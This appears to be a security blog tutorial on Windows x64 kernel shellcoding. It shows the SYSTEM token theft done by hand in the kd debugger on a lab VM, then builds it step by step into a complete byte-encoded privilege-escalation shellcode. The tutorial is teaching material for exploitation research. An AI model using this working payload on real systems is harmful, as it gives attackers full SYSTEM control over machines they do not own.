<!doctype html><html lang=en><head><meta charset=utf-8><meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name=viewport><meta content=BlahCats name=author><meta content="Tales of a binary encoded life..." name=description><meta prefix="og: http://ogp.me/ns#" content=BlahCats property=og:site_name><meta prefix="og: http://ogp.me/ns#" content=blog property=og:type><meta content="A Primer to Windows x64 shellcoding" prefix="og: http://ogp.me/ns#" property=og:title><meta content="A Primer to Windows x64 shellcoding - by hugsy" prefix="og: http://ogp.me/ns#" property=og:description><meta prefix="og: http://ogp.me/ns#" content=en_US property=og:locale><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/2017-08-14-a-primer-to-windows-x64-shellcoding property=og:url><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/img/win-kernel-debug/bg.png property=og:image><meta content=summary_large_image name=twitter:card><meta content=@ctf_blahcat name=twitter:site><meta content=BlahCats name=twitter:title><meta content="A Primer to Windows x64 shellcoding - by hugsy" name=twitter:description><meta content=https://blahcat.github.io/2017-08-14-a-primer-to-windows-x64-shellcoding name=twitter:url><meta content=https://blahcat.github.io/img/win-kernel-debug/bg.png name=twitter:image:src><script type=application/ld+json>
    {
      "@context" : "http://schema.org",
      "@type" : "Website",
      "name": " BlahCats",
      "url" : "https://blahcat.github.io/2017-08-14-a-primer-to-windows-x64-shellcoding",
      
      "image": https://blahcat.github.io/img/win-kernel-debug/bg.png",
      
      
      "description": A Primer to Windows x64 shellcoding - by hugsy",
      
    }
    </script><title>
  A Primer to Windows x64 shellcoding
</title><link href=https://blahcat.github.io/img/favicon.ico rel=icon type=image/x-icon><link href=https://blahcat.github.io/css/bootstrap.min.css rel=stylesheet><link href=" https://blahcat.github.io/css/all.min.css" rel=" stylesheet"><link href="https://fonts.googleapis.com/css?family=Roboto" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Montserrat:400,300" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lato" -- <!-- custom for rel=stylesheet styles template this><link href=https://blahcat.github.io/css/clean-blog.css rel=stylesheet><link href=https://blahcat.github.io/css/overrides.css rel=stylesheet><link integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css referrerpolicy=no-referrer rel=stylesheet><body><nav class="navbar navbar-expand-lg navbar-light fixed-top" id=mainNav><div class=container><a class=navbar-brand href=https://blahcat.github.io>BlahCats Blog</a><button aria-label="Toggle navigation" class="navbar-toggler navbar-toggler-right" aria-controls=navbarResponsive aria-expanded=false data-target=#navbarResponsive data-toggle=collapse type=button>Menu <i class="fas fa-bars"></i></button><div class="collapse navbar-collapse" id=navbarResponsive><ul class="navbar-nav ml-auto"><li class=nav-item><a class=nav-link href=https://blahcat.github.io>Home</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/series>Series</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/notes>Notes</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/about>About</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/qemu>Qemu VMs</a></ul></div></div></nav><header class=masthead style=background-image:url(https://blahcat.github.io/img/win-kernel-debug/bg.png)><div class=overlay></div><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><div class=post-heading><h1>A Primer to Windows x64 shellcoding</h1><span class=meta> <b> • <a href=/author/hugsy>hugsy</a> • </b> 14 August 2017 <br> <br> <i>Reading time: 8 min</i> </span></div></div></div></div></header><article><article class=post><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><p>Continuing on the path to Windows kernel exploitation…<p>Thanks to the previous post, we now have a working lab for easily (and in a reasonably fast manner) debug Windows kernel.<p>Let’s skip ahead for a minute and assume we control PC using some vulnerability in kernel land (next post), then we may want to jump back into a user allocated buffer to execute a control shellcode. So where do we go from now? How to transform this controlled PC in the kernel-land into a privileged process in user-land?<p>The classic technique is to steal the <code>System</code> process token and copy it into the structure of our targeted arbitrary (but unprivileged) process (say <code>cmd.exe</code>).<div class=alert-info markdown=span><b class=markdown-alert-title> <svg class="octicon octicon-info mr-2" viewbox="0 0 16 16" aria-hidden=true height=16 version=1.1 width=16><path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg> Note </b><p><p>Our target here will the Modern.IE Windows 8.1 x64 we created in the <a href=/2017/08/07/setting-up-a-windows-vm-lab-for-kernel-debugging>previous post</a>, that we’ll interact with using <code>kd</code> via Network debugging. Refer to previous post if you need to set it up.</div><h1 id=stealing-system-token-using-kd>Stealing SYSTEM token using <code>kd</code></h1><p>The <a rel="noopener nofollow noreferrer" href=https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-process target=_blank><code>!process</code></a> extension of WinDBG provides a structured display of one or all the processes.<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>kd> !process 0 0 System
</span><span>PROCESS ffffe000baa6c040
</span><span>   SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
</span><span>   DirBase: 001a7000  ObjectTable: ffffc0002f403000  HandleCount: &LTData Not Accessible>
</span><span>   Image: System
</span></code></pre><p>This leaks the address of the <code>_EPROCESS</code> structure in the kernel, of the process named <code>System</code>. Using <code>dt</code> will provide a lot more info (here, massively truncated to what interests us):<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>kd> dt _EPROCESS ffffe000baa6c040
</span><span>ntdll!_EPROCESS
</span><span>   +0x000 Pcb              : _KPROCESS
</span><span>   [...]
</span><span>   +0x2e0 UniqueProcessId  : 0x00000000`00000004 Void
</span><span>   +0x2e8 ActiveProcessLinks : _LIST_ENTRY [ 0xffffe000`bbc54be8 - 0xfffff801`fed220a0 ]
</span><span>   [...]
</span><span>   +0x348 Token            : _EX_FAST_REF
</span><span>   [...]
</span><span>   +0x430 PageDirectoryPte : 0
</span><span>   +0x438 ImageFileName    : [15]  "System"
</span></code></pre><p>At <code>nt!_EPROCESS.Token</code> (+0x348) we get the process token, which holds a pointer to an <a href="https://git.reactos.org/?p=reactos.git;a=blob;f=reactos/sdk/include/ndk/extypes.h;h=feaf7b95df50f7a9d95108882a2cdd71263a675b;hb=HEAD#l418" rel="noopener nofollow noreferrer" target=_blank>“Executive Fast Reference” structure</a>.<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>kd> dt nt!_EX_FAST_REF ffffe000baa6c040+348
</span><span>   +0x000 Object           : 0xffffc000`2f405598 Void
</span><span>   +0x000 RefCnt           : 0y1000
</span><span>   +0x000 Value            : 0xffffc000`2f405598
</span></code></pre><p>If we nullify the last nibble of the address (i.e. AND with -0xf on x64, -7 on x86), we end up having the <code>System</code> token’s address:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>kd> ? 0xffffc000`2f405598 & -f
</span><span>Evaluate expression: -70367951432304 = ffffc000`2f405590
</span><span>
</span><span>kd> dt nt!_TOKEN ffffc000`2f405590
</span><span>    +0x000 TokenSource      : _TOKEN_SOURCE
</span><span>    +0x010 TokenId          : _LUID
</span><span>    +0x018 AuthenticationId : _LUID
</span><span>    +0x020 ParentTokenId    : _LUID
</span><span>    +0x028 ExpirationTime   : _LARGE_INTEGER 0x06207526`b64ceb90
</span><span>    +0x030 TokenLock        : 0xffffe000`baa4ef90 _ERESOURCE
</span><span>    +0x038 ModifiedId       : _LUID
</span><span>    +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
</span><span>    +0x058 AuditPolicy      : _SEP_AUDIT_POLICY
</span><span>    [...]
</span></code></pre><div class=alert-info markdown=span><b class=markdown-alert-title> <svg class="octicon octicon-info mr-2" viewbox="0 0 16 16" aria-hidden=true height=16 version=1.1 width=16><path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg> Note </b><p><p>the WinDBG extension <a rel="noopener nofollow noreferrer" href=https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-token target=_blank><code>!token</code></a> provides a more detailed (and parsed) output. You might to refer to it instead whenever you are analyzing tokens.</div><p>So basically, if we create a process (say <code>cmd.exe</code>), and overwrite its token with the <code>System</code> token value we found (0xffffc0002f405590), our process will be running as <code>System</code>. Let’s try!</p><a href=/img/win-kernel-debug/token-bump-via-windbg-1.png target=_blank> <img alt=image_alt src=/img/win-kernel-debug/token-bump-via-windbg-1.png title=image_alt width=100%> </a><p>We search our process using <code>kd</code>:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>kd> !process 0 0 cmd.exe
</span><span>PROCESS ffffe000babfd900
</span><span>    SessionId: 1  Cid: 09fc    Peb: 7ff6fa81c000  ParentCid: 0714
</span><span>    DirBase: 45c4c000  ObjectTable: ffffc00036d03940  HandleCount: &LTData Not  Accessible>
</span><span>    Image: cmd.exe
</span></code></pre><p>Overwrite the offset 0x348 with the <code>SYSTEM</code> token pointer (0xffffc0002f405590).<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>kd> dq ffffe000bc043900+348 l1
</span><span>ffffe000`bc043c48  ffffc000`30723426
</span><span>kd> eq 0xffffe000babfd900+0x348 0xffffc0002f405590
</span></code></pre><p>And tada …</p><a href=/img/win-kernel-debug/token-bump-via-windbg-2.png target=_blank> <img alt=image_alt src=/img/win-kernel-debug/token-bump-via-windbg-2.png title=image_alt width=100%> </a><p>Now we know how to transform any unprivileged process into a privileged one using <code>kd</code>.<h1 id=shellcoding-our-way-to-system>Shellcoding our way to SYSTEM</h1><p>So the basic idea now, to reproduce the same steps that we did in the last part, but from our shellcode. So we need:<ol><li>A pointer to <code>System</code> <code>EPROCESS</code> structure, and save the token (located at offset +0x348)<li>Look up for the current process <code>EPROCESS</code> structure<li>Overwrite its token with <code>System</code>’s<li>Profit!</ol><h2 id=getting-the-current-process-structure-address>Getting the current process structure address</h2><p>Pointers to process structures on Windows are stored in a doubly linked list (see the member <code>ActiveProcessLinks</code> of <code>nt!_EPROCESS</code> in <code>kd</code>). If we have the address to one process, we can “scroll” back and forward to discover the others. But first, we need to get the address of at the least one process in the kernel.<p>This is exactly the purpose of the routine <code>nt!PsGetCurrentProcess</code>, but since we can’t call it directly (thank you ASLR), we can still check what is it doing under the hood:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>kd> uf nt!PsGetCurrentProcess
</span><span>nt!PsGetCurrentProcess:
</span><span>fffff801`feb06e84 65488b042588010000   mov   rax,qword ptr gs:[188h]
</span><span>fffff801`feb06e8d 488b80b8000000       mov   rax,qword ptr [rax+0B8h]
</span><span>fffff801`feb06e94 c3                   ret
</span><span>
</span><span>kd> dps gs:188 l1
</span><span>002b:00000000`00000188  fffff801`fedbfa00 nt!KiInitialThread
</span></code></pre><p><code>mov rax, qword ptr gs:[188h]</code> returns a pointer to an <code>_ETHREAD</code> structure (more specifically the kernel thread (KTHREAD) <code>nt!KiInitialThread</code>). If we check the content of this structure at the offset 0xb8, we find the structure to the current process:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>kd> dt nt!_EPROCESS poi(nt!KiInitialThread+b8)
</span><span>   +0x000 Pcb              : _KPROCESS
</span><span>   [...]
</span><span>   +0x2e0 UniqueProcessId  : 0x00000000`00000004 Void
</span><span>   +0x2e8 ActiveProcessLinks : _LIST_ENTRY [ 0xffffe000`bbc54be8 - 0xfffff801`fed220a0 ]
</span><span>   [...]
</span><span>   +0x348 Token            : _EX_FAST_REF
</span></code></pre><p>So now we know where our current process resides in the kernel (just like <code>kd</code> gave us using <code>!process 0 0 cmd.exe</code> earlier), and therefore the first of our shellcode:<pre class=language-asm data-lang=asm style=color:#c0c5ce;background-color:#2b303b><code class=language-asm data-lang=asm><span style=color:#8fa1b3>  </span><span style=color:#b48ead>mov </span><span style=color:#bf616a>rax</span><span>, </span><span style=color:#bf616a>gs</span><span style=color:#8fa1b3>:</span><span style=color:#d08770>0x188
</span><span style=color:#8fa1b3>  </span><span style=color:#b48ead>mov </span><span style=color:#bf616a>rax</span><span>, [</span><span style=color:#bf616a>rax </span><span>+ </span><span style=color:#d08770>0xb8</span><span>]
</span></code></pre><h2 id=browsing-through-the-process-list-to-reach-system>Browsing through the process list to reach <code>System</code></h2><p>The processes are stored in the <code>ActiveProcessLinks</code> (offset 0x2e8) of the <code>nt!_EPROCESS</code> structure, via a <code>_LIST_ENTRY</code>, which is a doubly linked list in its simplest form:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>kd> dt _LIST_ENTRY
</span><span>ntdll!_LIST_ENTRY
</span><span>   +0x000 Flink            : Ptr64 _LIST_ENTRY
</span><span>   +0x008 Blink            : Ptr64 _LIST_ENTRY
</span></code></pre><p>Since we know that <code>System</code> process ID is 4, we can write a very small loop in assembly, whose pseudo-C code would be:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span>ptrProcess = curProcess
</span><span style=color:#b48ead>while</span><span> ptrProcess->UniqueProcessId != SystemProcess-></span><span style=color:#bf616a>UniqueProcessId </span><span>(</span><span style=color:#d08770>4</span><span>) {
</span><span>   ptrProcess = ptrProcess->Flink
</span><span>}
</span></code></pre><p>Which builds the second part of our shellcode:<pre class=language-asm data-lang=asm style=color:#c0c5ce;background-color:#2b303b><code class=language-asm data-lang=asm><span style=color:#65737e>;; rax has the pointer to the current KPROCESS
</span><span style=color:#b48ead>mov </span><span style=color:#bf616a>rbx</span><span>, </span><span style=color:#bf616a>rax
</span><span>
</span><span style=color:#8fa1b3>__loop:
</span><span style=color:#b48ead>mov </span><span style=color:#bf616a>rbx</span><span>, [</span><span style=color:#bf616a>rbx </span><span>+ </span><span style=color:#d08770>0x2e8</span><span>]</span><span style=color:#65737e> ;; +0x2e8  ActiveProcessLinks[0].Flink
</span><span style=color:#b48ead>sub </span><span style=color:#bf616a>rbx</span><span>, </span><span style=color:#d08770>0x2e8</span><span style=color:#65737e> ;; nextProcess
</span><span style=color:#b48ead>mov </span><span style=color:#bf616a>rcx</span><span>, [</span><span style=color:#bf616a>rbx </span><span>+ </span><span style=color:#d08770>0x2e0</span><span>]</span><span style=color:#65737e> ;; +0x2e0  UniqueProcessId
</span><span style=color:#b48ead>cmp </span><span style=color:#bf616a>rcx</span><span>, </span><span style=color:#d08770>4</span><span style=color:#65737e> ;; compare to target PID
</span><span style=color:#b48ead>jnz </span><span style=color:#8fa1b3>__loop
</span><span>
</span><span style=color:#65737e>;; here rbx hold a pointer to System structure
</span></code></pre><h2 id=overwrite-the-current-process-token-field-with-system-s>Overwrite the current process token field with <code>System</code>’s</h2><p>This is the third and final part of our shellcode, and the easiest since everything was done in the steps above:<pre class=language-asm data-lang=asm style=color:#c0c5ce;background-color:#2b303b><code class=language-asm data-lang=asm><span style=color:#65737e>;; rax has the pointer to the current KPROCESS
</span><span style=color:#65737e>;; rbx has the pointer to System KPROCESS
</span><span>
</span><span style=color:#b48ead>mov </span><span style=color:#bf616a>rcx</span><span>, [</span><span style=color:#bf616a>rbx </span><span>+ </span><span style=color:#d08770>0x348</span><span>]</span><span style=color:#65737e> ;; +0x348  Token
</span><span style=color:#b48ead>and </span><span style=color:#bf616a>cl</span><span>, </span><span style=color:#d08770>0xf0</span><span style=color:#65737e> ;; we must clear the lowest nibble
</span><span style=color:#b48ead>mov </span><span>[</span><span style=color:#bf616a>rax </span><span>+ </span><span style=color:#d08770>0x348</span><span>], </span><span style=color:#bf616a>rcx
</span></code></pre><h1 id=the-final-shellcode>The final shellcode</h1><p>We add a few extra instructions to correctly save and restore the context, and make sure we exit cleanly:</p><script src=https://gist.github.com/hugsy/763ec9e579796c35411a5929ae2aca27.js></script><p>We can now simply use any assembler (NASM, YASM) - but I have a personal preference for <a rel="noopener nofollow noreferrer" href=http://keystone-engine.org target=_blank>Keystone-Engine</a> - to generate a bytecode version of our shellcode.<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span style=color:#b48ead>#define </span><span>LEN </span><span style=color:#d08770>80
</span><span>
</span><span style=color:#b48ead>const char</span><span> sc[LEN] = ""
</span><span>  "</span><span style=color:#96b5b4>\x50</span><span>"                                             </span><span style=color:#65737e>// push rax
</span><span>  "</span><span style=color:#96b5b4>\x53</span><span>"                                             </span><span style=color:#65737e>// push rbx
</span><span>  "</span><span style=color:#96b5b4>\x51</span><span>"                                             </span><span style=color:#65737e>// push rcx
</span><span>  "</span><span style=color:#96b5b4>\x48\x65\xa1\x88\x01\x00\x00\x00\x00\x00\x00</span><span>"     </span><span style=color:#65737e>// mov rax, gs:0x188
</span><span>  "</span><span style=color:#96b5b4>\x48\x8b\x80\xb8\x00\x00\x00</span><span>"                     </span><span style=color:#65737e>// mov rax, [rax+0xb8]
</span><span>  "</span><span style=color:#96b5b4>\x48\x89\xc3</span><span>"                                     </span><span style=color:#65737e>// mov rbx, rax
</span><span>  "</span><span style=color:#96b5b4>\x48\x8b\x9b\xe8\x02\x00\x00</span><span>"                     </span><span style=color:#65737e>// mov rbx, [rbx+0x2e8]
</span><span>  "</span><span style=color:#96b5b4>\x48\x81\xeb\xe8\x02\x00\x00</span><span>"                     </span><span style=color:#65737e>// sub rbx, 0x2e8
</span><span>  "</span><span style=color:#96b5b4>\x48\x8b\x8b\xe0\x02\x00\x00</span><span>"                     </span><span style=color:#65737e>// mov rcx, [rbx+0x2e0]
</span><span>  "</span><span style=color:#96b5b4>\x48\x83\xf9\x04</span><span>"                                 </span><span style=color:#65737e>// cmp rcx, 4
</span><span>  "</span><span style=color:#96b5b4>\x75\x15</span><span>"                                         </span><span style=color:#65737e>// jnz 0x17
</span><span>  "</span><span style=color:#96b5b4>\x48\x8b\x8b\x48\x03\x00\x00</span><span>"                     </span><span style=color:#65737e>// mov rcx, [rbx + 0x348]
</span><span>  "</span><span style=color:#96b5b4>\x48\x89\x88\x48\x03\x00\x00</span><span>"                     </span><span style=color:#65737e>// mov [rax + 0x348], rcx
</span><span>  "</span><span style=color:#96b5b4>\x59</span><span>"                                             </span><span style=color:#65737e>// pop rcx
</span><span>  "</span><span style=color:#96b5b4>\x5b</span><span>"                                             </span><span style=color:#65737e>// pop rbx
</span><span>  "</span><span style=color:#96b5b4>\x58</span><span>"                                             </span><span style=color:#65737e>// pop rax
</span><span>  "</span><span style=color:#96b5b4>\x58\x58\x58\x58\x58</span><span>"                             </span><span style=color:#65737e>// pop rax; pop rax; pop rax; pop rax; pop rax; (required for proper stack return)
</span><span>  "</span><span style=color:#96b5b4>\x48\x31\xc0</span><span>"                                     </span><span style=color:#65737e>// xor rax, rax  (i.e. NT_SUCCESS)
</span><span>  "</span><span style=color:#96b5b4>\xc3</span><span>"                                             </span><span style=color:#65737e>// ret
</span><span>  "";
</span></code></pre><p>Once copied into an executable location, this shellcode will grant the current process with all <code>System</code> privileges.<p>The next post will actually use this newly created shellcode in a concrete vulnerability exploitation (from the <a rel="noopener nofollow noreferrer" href=https://github.com/hacksysteam/HackSysExtremeVulnerableDriver target=_blank>Extremely Vulnerable Driver</a> by HackSys Team.<p>Until then, take care!<h1 id=recommended-readings>Recommended readings</h1><ol><li><a rel="noopener nofollow noreferrer" href=https://www.amazon.com/Guide-Kernel-Exploitation-Attacking-Core/dp/1597494860 target=_blank>A Guide to Kernel Exploitation - Attacking The Core</a><li><a rel="noopener nofollow noreferrer" href=https://securitycafe.ro/2015/10/30/introduction-to-windows-shellcode-development-part1/ target=_blank>Introduction To Windows Shellcode Development</a><li><a rel="noopener nofollow noreferrer" href=https://mcdcyber.wordpress.com/2011/03/07/x64-kernel-privilege-escalation/ target=_blank>x64 Kernel Privilege Escalation</a><li><a rel="noopener nofollow noreferrer" href=https://support.microsoft.com/en-ca/help/243330/well-known-security-identifiers-in-windows-operating-systems target=_blank>Well-Known Security IDentifiers</a><li><a rel="noopener nofollow noreferrer" href=http://hick.org/code/skape/papers/win32-shellcode.pdf target=_blank>Understanding Windows Shellcode</a></ol><aside class=post-tags><p>Categories: <a href=https://blahcat.github.io/categories/tutorial/>#tutorial</a><p>Tags: <a href=https://blahcat.github.io/tags/windows/>#windows</a> <a href=https://blahcat.github.io/tags/kernel/>#kernel</a> <a href=https://blahcat.github.io/tags/debugging/>#debugging</a> <a href=https://blahcat.github.io/tags/pwn/>#pwn</a> <a href=https://blahcat.github.io/tags/token/>#token</a> <a href=https://blahcat.github.io/tags/shellcode/>#shellcode</a></aside><aside class=post-discussion>Join the Discussion on <a href="https://github.com/blahcat/blahcat.github.io/discussions?discussions_q=A Primer to Windows x64 shellcoding" target=_blank> <i class="fab fa-github fa-lg"></i> GitHub </a></aside><aside class=post-nav><div class=container><div class=row><div class=col><b>Next:</b><br><a class=post-nav-prev href=https://blahcat.github.io/2017-08-18-first-exploit-in-windows-kernel-hevd/> <section class=post-nav-teaser><b class=post-nav-title>First exploit in Windows Kernel (HEVD)</b><p class=post-nav-excerpt>Hi there ✋ This post is the third chapter of this series, where we dive int…</section> </a></div><div class=col><b>Previous:</b><br><a class=post-nav-next href=https://blahcat.github.io/2017-08-07-setting-up-a-windows-vm-lab-for-kernel-debugging/> <section class=post-nav-teaser><b class=post-nav-title>Setting up a Windows VM lab for kernel debugging</b><p class=post-nav-excerpt>This is the first on a series of posts on Windows kernel debugging and expl…</section> </a></div></div></div></aside></div></div><hr><footer><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><ul class="list-inline text-center"><li class=list-inline-item><a href=https://blahcat.github.io/atom.xml> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fas fa-rss fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://twitter.com/ctf_blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-twitter fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://github.com/blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-github fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://www.youtube.com/channel/UCDrgY65mRZWVoMiB5-VMqfg> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-youtube fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://discord.gg/hSbqxxBgRX> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-discord fa-stack-1x fa-inverse"></i> </span> </a></ul><p class="copyright text-muted">Made with ❤ with Zola</div></div></div></footer><script src=https://blahcat.github.io/js/jquery.min.js></script><script src=https://blahcat.github.io/js/bootstrap.bundle.min.js></script><script src=https://blahcat.github.io/js/clean-blog.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.1/mermaid.min.js></script><div class=mermaidTooltip style=opacity:0></div>